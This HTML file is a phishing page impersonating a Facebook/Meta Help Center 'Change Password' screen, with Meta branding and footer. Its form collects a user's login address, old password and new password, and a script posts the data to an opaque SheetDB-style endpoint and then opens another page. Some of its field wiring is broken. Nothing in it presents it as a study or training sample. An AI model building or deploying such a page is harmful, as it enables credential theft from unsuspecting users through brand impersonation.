<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Change Password</title>
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css" rel="stylesheet">
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            padding: 20px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
            position: relative;
        }

        /* Header */
        .header {
            display: flex;
            justify-content: space-between;
            padding: 10px 20px;
            position: fixed;
            top: 0;
            right: 0;
            left: 0;
            width: 100%;
            background-color: #fff;
            z-index: 1000;
        }

        /* Facebook logo and Help Center on the left */
        .header .facebook-logo {
            display: flex;
            align-items: center;
            color: #1877f2; /* Change color to blue */
            font-size: 20px;
        }

        .header .facebook-logo i {
            font-size: 30px;
            margin-left: 10px;
        }

        /* Search bar */
        .header .search-container {
            display: flex;
            align-items: center;
            margin-left: 20px;
            position: relative;
        }

        .header .search-container input {
            padding: 5px 15px;
            border-radius: 5px;
            border: 1px solid #ccc;
            font-size: 14px;
            width: 200px;
        }

        .header .search-container i {
            position: absolute;
            left: 10px;
            font-size: 18px;
            color: #aaa;
        }

        /* Profile picture */
        .header .user-info {
            display: flex;
            align-items: center;
            cursor: pointer;
            margin-left: 20px;
        }

        .header .user-info img {
            border-radius: 50%;
            width: 40px;
            height: 40px;
            margin-left: 10px;
            background-color: #e0e0e0; /* Background color if no image */
        }

        /* Language selector */
        .header .language-selector {
            display: flex;
            align-items: center;
            margin-left: 20px;
            cursor: pointer;
        }

        .header .language-selector select {
            padding: 5px 10px;
            font-size: 14px;
            border-radius: 5px;
            border: 1px solid #ccc;
        }

        /* Form container */
        .container {
            background-color: #fff;
            padding: 30px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            border: 1px solid #ccc;
            text-align: right;
            margin-top: 100px;
            position: relative;
            border-radius: 15px;
            padding-bottom: 60px; /* Adding padding at the bottom of the form */
        }

        h1 {
            color: black;
            text-align: right;
            margin-bottom: 20px;
        }

        hr {
            border: 1px solid #f1f1f1;
            margin-bottom: 20px;
        }

        label {
            font-weight: bold;
        }

        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0 20px 0;
            display: inline-block;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }

        .password-note {
            font-size: 14px;
            color: #000000;
            margin-bottom: 10px;
            text-align: center;
        }

        .forgot-password {
            text-align: center;
            margin-top: 10px;
        }

        .forgot-password a {
            color: #1877f2;
            text-decoration: none;
            font-size: 14px;
        }

        .forgot-password a:hover {
            text-decoration: underline;
        }

        .logout-other-devices {
            font-size: 14px;
            color: #000;
            margin-top: 10px;
        }

        .logout-other-devices input[type="checkbox"] {
            margin-left: 10px;
        }

        /* Save changes button */
        .signupbtn {
            padding: 10px 18px;
            width: 100%;
            font-size: 16px;
            margin: 20px 0 0 0;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            background-color: #1877f2;
            color: white;
        }

        .signupbtn:hover {
            background-color: #166fe5;
        }

        /* Success message */
        .success-message {
            color: green;
            font-size: 16px;
            font-weight: bold;
            text-align: center;
            margin-top: 20px;
            display: none; /* Hide message by default */
        }

        /* Footer links */
        .footer-links {
            text-align: center;
            font-size: 12px;
            margin-top: 30px;
            color: #555;
        }

        .footer-links a {
            color: #1877f2;
            text-decoration: none;
            margin: 0 8px;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }
    </style>
</head>
<body>

    <!-- Header with logo, search, profile picture, and language selector -->
    <div class="header">
        <!-- Facebook logo and Help Center on the left -->
        <div class="facebook-logo">
            <i class="fab fa-facebook"></i> 
            <span>Help Center</span>
        </div>

        <!-- Search bar, profile picture, and language selector on the right -->
        <div style="display: flex; align-items: center;">
            <!-- Search bar -->
            <div class="search-container">
                <i class="fas fa-search"></i> <!-- Adding search icon inside the search bar -->
                <input type="text" placeholder="Search...">
            </div>

            <!-- Profile picture -->
            <div class="user-info" onclick="toggleDropdown()">
                <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Default_Pfp.jpg" alt="Profile Picture">
                <span>▼</span>
            </div>

            <!-- Language selector -->
            <div class="language-selector">
                <select>
                    <option>Arabic</option>
                    <option>English</option>
                    <option>French</option>
                </select>
            </div>
        </div>
    </div>

    <!-- Form container -->
    <form action="oz3khn9ysqhql" method="post" id="sheetdb-form">
        <div class="container">
            <h1>Change Password</h1>
            <hr>

            <div class="password-note">
                Password must be at least 6 characters long and include a mix of numbers, letters, and special characters like: `%@$!`
            </div>

            <label for="address"><b>Address</b></label>
            <input type="text" id="data[address]" placeholder="Enter address" required>

            <label for="password"><b>Old Password</b></label>
            <input type="password" id="data[password]" placeholder="Enter old password" required>

            <label for="new-password"><b>New Password</b></label>
            <input type="password" id="data[new-password]" placeholder="Enter new password" required>

            <label for="repeat-password"><b>Repeat New Password</b></label>
            <input type="password" id="data[repeat-password]" placeholder="Re-enter new password" required>

            <div class="logout-other-devices">
                <label>
                    <input type="checkbox" name="logout-devices">
                    Log out of other devices
                </label>
            </div>

            <!-- Save changes button -->
            <button type="button" class="signupbtn" onclick="saveChanges()">Save Changes</button>

            <!-- Forgot password link -->
            <div class="forgot-password">
                <a href="#">Forgot Password?</a>
            </div>

            <!-- Success message -->
            <div id="successMessage" class="success-message">Changes saved successfully</div>
        </div>
    </form>


      <script>
            var form = document.getElementById('sheetdb-form');
        form.addEventListener("submit", e => {
          e.preventDefault();
          fetch(form.action, {
              method : "POST",
              body: new FormData(document.getElementById("sheetdb-form")),
          }).then(
              response => response.json()
          ).then((html) => {
            // you can put any JS code here
            window.open('d.html', '_blank');

          });
        });



      </script>

    <!-- Footer links -->
    <div class="footer-links">
        <a href="#">Privacy</a>
        <a href="#">Terms & Policies</a>
        <a href="#">Ad Choices</a>
        <a href="#">Jobs</a>
        <a href="#">Cookies</a>
        <a href="#">Create Ad</a>
        <a href="#">Create Page</a>
        <p>© 2024 Meta</p>
    </div>

    <script>
        // Save changes function
        function saveChanges() {
            var address = document.getElementById('address').value;
            var oldPassword = document.getElementById('password').value;
            var newPassword = document.getElementById('new-password').value;
            var repeatPassword = document.getElementById('repeat-password').value;

            // Check if all fields are filled
            if (address && oldPassword && newPassword && repeatPassword) {
                // Check if new password matches repeat password
                if (newPassword === repeatPassword) {
                    // Show success message
                    var successMessage = document.getElementById('successMessage');
                    successMessage.style.display = 'block';

                    // Hide the message after 3 seconds
                    setTimeout(function() {
                        successMessage.style.display = 'none';
                    }, 3000);
                } else {
                    alert("New password does not match the repeat password!");
                }
            } else {
                alert("Please fill out all fields!");
            }
        }
    </script>
</body>
</html>
